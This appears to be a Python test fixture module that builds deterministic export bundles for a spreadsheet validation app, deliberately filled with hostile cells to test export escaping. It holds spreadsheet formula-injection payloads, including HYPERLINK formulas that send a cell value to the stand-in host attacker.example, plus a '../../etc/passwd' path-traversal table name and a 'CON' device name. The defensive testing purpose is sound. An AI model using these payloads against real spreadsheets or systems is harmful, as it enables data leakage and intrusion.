"""Deterministic export bundles with hostile content.

The dataset comes from :class:`tests.support.builders.DatasetBuilder`, the issues from the
``IssueFactory`` of :func:`tests.support.builders.make_context`, documents and runs from the
models. Cell texts, a header, table names and issue texts are formula-injection payloads,
quotes, commas, line breaks, NUL and non-ASCII text, so every export path meets them.
"""

from __future__ import annotations

import hashlib
from collections.abc import Sequence
from datetime import UTC, datetime, timedelta
from decimal import Decimal

from app.exporters.bundle import ExportBundle
from app.models.dataset import Dataset, RowKind
from app.models.document import Document, DocumentFormat, ProcessingStatus, StoredFile
from app.models.issue import (
    EvidenceClass,
    EvidenceItem,
    EvidenceKind,
    IssueCategory,
    ReviewStatus,
    Severity,
    ValidationIssue,
)
from app.models.plan import PlannerKind, PlanStep, ValidationPlan
from app.models.profile import DomainProfile
from app.models.run import (
    DetectorExecutionStatus,
    DetectorRunReport,
    RunStatus,
    ValidationRun,
)
from app.models.source import SourceKind, SourceLocation
from app.validation.contracts.detector import DetectorCategory, DetectorSpec
from app.validation.contracts.issue_factory import money_impact
from tests.support.builders import DatasetBuilder, make_context, number_cell, text_cell

T0 = datetime(2026, 3, 1, 9, 0, tzinfo=UTC)
GENERATED_AT = datetime(2026, 11, 18, 10, 30, 0, tzinfo=UTC)
RUN_ID = "run_000001"
DOCUMENT_FILENAME = "Angebot März 2026 €.xlsx"

# Texts a spreadsheet would read as a formula (the brief's hostile-cell list).
HOSTILE_TEXTS: tuple[str, ...] = (
    "=1+1",
    "+SUM(A1)",
    "-2+3",
    "@cmd",
    "\t=x",
    ' \t=HYPERLINK("https://attacker.example/?"&A1,"Details")',
    "\r=x",
)
EXPLANATION = 'Menge × Preis = 131,25 "EUR", nicht 25,00;\nzweite Zeile\r\ndritte Zeile'

BILL_COLUMNS = [
    ("Item", "item_code"),
    ("Description", "description"),
    ("Qty", "quantity"),
    ("Unit", "unit"),
    ("=Rate", "unit_price"),  # a hostile header
    ("Amount", "line_total"),
]

PROBE_SPEC = DetectorSpec(
    detector_id="test.export_probe",
    name="Export probe",
    version="1.0.0",
    category=DetectorCategory.DETERMINISTIC,
    description="Creates findings for the export tests.",
    applicability="always",
    evidence_classes=(
        EvidenceClass.CONFIRMED_RULE_VIOLATION,
        EvidenceClass.NEEDS_EXTERNAL_CONTEXT,
    ),
    issue_categories=(IssueCategory.ARITHMETIC, IssueCategory.MISSING_VALUE),
    limitations=("Synthetic.",),
)
OTHER_SPEC = DetectorSpec(
    detector_id="test.another_probe",
    name="Another probe",
    version="2.1.0",
    category=DetectorCategory.STATISTICAL,
    description="Listed to check the detector order.",
    applicability="never",
    evidence_classes=(EvidenceClass.SUSPECTED_ANOMALY,),
    issue_categories=(IssueCategory.STATISTICAL_OUTLIER,),
)


def build_dataset(profile: DomainProfile) -> Dataset:
    """Three tables: a bill ``LV`` with hostile cells, ``../../etc/passwd`` with an unmapped
    column without header, and ``CON``."""
    builder = DatasetBuilder(profile)
    bill = builder.table("LV", BILL_COLUMNS)
    bill.row([None, "Erdarbeiten", None, None, None, None], kind=RowKind.SECTION)  # row 2
    bill.row(["01.001", "=1+1", "10.500", "m³", "12.50", "131.25"])  # row 3
    bill.row(["01.002", 'Aushub "BK 3", tief\nZeile 2', "-2", "m3", "-12.50", "25.00"])  # 4
    bill.row(
        [
            "@cmd",
            "Nul\x00Zeichen",
            "1",
            "St",
            number_cell("-12.50", raw="-12,50 €"),  # a number whose raw text is not plain
            "approx. 5",  # a failed number
        ]
    )  # row 5
    bill.row([None, "Summe Erdarbeiten", None, None, None, "156.25"], kind=RowKind.SUBTOTAL)
    other = builder.table(
        "../../etc/passwd", [("Item", "item_code"), (None, None), ("Amount", "line_total")]
    )
    other.row(["00.001", "-7", "-2500.00"])
    device = builder.table("CON", [("Note", "description")])
    device.row(["-2+3"])
    device.row([text_cell("-5")])  # a plain number written as text
    return builder.build()


def as_delimited(dataset: Dataset) -> Dataset:
    """The same dataset as if it came from a CSV file (delimited-text sources)."""
    tables = []
    for table in dataset.tables:
        rows = [
            row.evolve(
                cells={
                    column_id: cell.evolve(
                        source=SourceLocation(
                            kind=SourceKind.DELIMITED_TEXT,
                            row_number=cell.source.row_number,
                            column_number=cell.source.column_number,
                        )
                    )
                    for column_id, cell in row.cells.items()
                }
            )
            for row in table.rows
        ]
        tables.append(
            table.evolve(rows=rows, source=SourceLocation(kind=SourceKind.DELIMITED_TEXT))
        )
    return dataset.evolve(tables=tables)


def build_issues(dataset: Dataset, profile: DomainProfile) -> list[ValidationIssue]:
    """Three findings in register order: a line total with a financial impact, a table-level
    finding, and a reviewed finding with two highlighted cells."""
    context = make_context(dataset, profile, run_id=RUN_ID)
    bill, other = dataset.tables[0], dataset.tables[1]
    first, second = (row for row in bill.rows if row.kind is RowKind.ITEM and row.position < 3)
    line_total = context.issues.create(
        PROBE_SPEC,
        rule_id="line_total",
        category=IssueCategory.ARITHMETIC,
        severity=Severity.HIGH,
        evidence_class=EvidenceClass.CONFIRMED_RULE_VIOLATION,
        title="@cmd line total differs",
        explanation=EXPLANATION,
        table=bill,
        row=first,
        evidence=[EvidenceItem(kind=EvidenceKind.NOTE, label="Probe", detail="Export probe.")],
        cells=[context.cell_ref(bill, first, "line_total")],
        inputs=[context.cell_ref(bill, first, f) for f in ("quantity", "unit_price")],
        observed_value='=HYPERLINK("https://attacker.example","x")',
        expected_value="-2+3",
        suggested_action="\t=x",
        financial_impact=money_impact(
            Decimal("-12.50"),
            "EUR",
            "reported line total minus quantity × unit price",
            reported=Decimal("118.75"),
            recomputed=Decimal("131.25"),
        ),
    )
    table_level = context.issues.create(
        PROBE_SPEC,
        rule_id="required_column",
        category=IssueCategory.MISSING_VALUE,
        severity=Severity.MEDIUM,
        evidence_class=EvidenceClass.NEEDS_EXTERNAL_CONTEXT,
        title="Unit price column missing",
        explanation="No column is mapped to unit_price.",
        table=other,
        evidence=[EvidenceItem(kind=EvidenceKind.NOTE, label="Probe", detail="Export probe.")],
        subject="unit_price",
    )
    reviewed = context.issues.create(
        PROBE_SPEC,
        rule_id="sign",
        category=IssueCategory.ARITHMETIC,
        severity=Severity.LOW,
        evidence_class=EvidenceClass.CONFIRMED_RULE_VIOLATION,
        title="Negative quantity and rate",
        explanation="Both values are negative.",
        table=bill,
        evidence=[EvidenceItem(kind=EvidenceKind.NOTE, label="Probe", detail="Export probe.")],
        row=second,
        cells=[context.cell_ref(bill, second, f) for f in ("quantity", "unit_price")],
        observed_value="-12.50",
    ).with_review(ReviewStatus.CONFIRMED_ERROR, "\r=x geprüft", at=T0 + timedelta(hours=2))
    return [line_total, table_level, reviewed]


def make_document(filename: str = DOCUMENT_FILENAME) -> Document:
    digest = hashlib.sha256(b"original upload").hexdigest()
    return Document(
        document_id="doc_000001",
        original_filename=filename,
        format=DocumentFormat.XLSX,
        uploaded_at=T0,
        source_file=StoredFile(
            storage_key=digest,
            sha256=digest,
            size_bytes=48_211,
            media_type="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        ),
        processing_status=ProcessingStatus.PROCESSED,
        profile_id="boq",
    )


def make_run(dataset: Dataset, *, run_id: str = RUN_ID, issue_count: int = 3) -> ValidationRun:
    return ValidationRun(
        run_id=run_id,
        document_id=dataset.document_id,
        dataset_id=dataset.dataset_id,
        dataset_revision=dataset.revision,
        profile_id=dataset.profile_id,
        profile_version=dataset.profile_version,
        status=RunStatus.COMPLETED,
        plan=ValidationPlan(
            planner=PlannerKind.BASELINE, steps=[PlanStep(detector_id=PROBE_SPEC.detector_id)]
        ),
        started_at=T0,
        finished_at=T0 + timedelta(minutes=1),
        detector_reports=[
            DetectorRunReport(
                detector_id=PROBE_SPEC.detector_id,
                detector_version=PROBE_SPEC.version,
                status=DetectorExecutionStatus.COMPLETED,
                config={"tolerance": "0.01"},  # the pipeline stores JSON-mode configs
                issues_found=issue_count,
                coverage={"rows_checked": 3},
            )
        ],
        issue_count=issue_count,
    )


def make_bundle(
    profile: DomainProfile,
    *,
    dataset: Dataset | None = None,
    issues: Sequence[ValidationIssue] | None = None,
    generated_at: datetime = GENERATED_AT,
) -> ExportBundle:
    data = dataset if dataset is not None else build_dataset(profile)
    found = list(issues) if issues is not None else build_issues(data, profile)
    return ExportBundle(
        document=make_document(),
        dataset=data,
        run=make_run(data, issue_count=len(found)),
        issues=found,
        detectors=[PROBE_SPEC, OTHER_SPEC],
        generated_at=generated_at,
    )
